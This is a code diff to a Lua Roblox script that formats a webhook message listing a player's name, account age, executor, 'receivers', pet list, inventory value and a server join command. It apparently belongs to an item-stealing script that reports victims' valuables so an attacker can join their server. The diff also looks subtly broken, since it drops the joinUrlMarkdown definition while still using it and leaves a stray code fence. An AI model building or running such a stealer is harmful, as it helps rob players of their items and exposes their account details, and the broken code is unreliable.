@@ -325,7 +325,12 @@ local function SendJoinMessage(list, prefix)
     local placeId = tostring(game.PlaceId or "N/A")
 
     -- Build the embed description
-    local joinUrlMarkdown = string.format("[%s](%s)", jobId, joinUrl)
+    local joinSection = ""
+    if serverType == "VIPServer" then
+        joinSection = "This server cannot be joined (VIP or restricted)."
+    else
+        joinSection = string.format("**%s**\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")```", joinUrlMarkdown, placeId, jobId)
+    end
     local description = string.format([[ 
 :bust_in_silhouette: **Player Information**
 ```Name: %s
@@ -337,9 +342,8 @@ Account Age: %s days```
 :palm_tree: **Pet List**
 ```%s```
 :island: **Join with URL**
-**%s**
-```game:GetService(\u001b["TeleportService"\u001b[0m):TeleportToPlaceInstance(\u001b[%s\u001b[0m, \u001b["%s"\u001b[0m)```
-]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrlMarkdown, placeId, jobId)
+%s
+]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinSection)
 
     local data = {
         ["content"] = prefix .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, "68a50a57-0d56-4794-8017-6013bce03b12")',
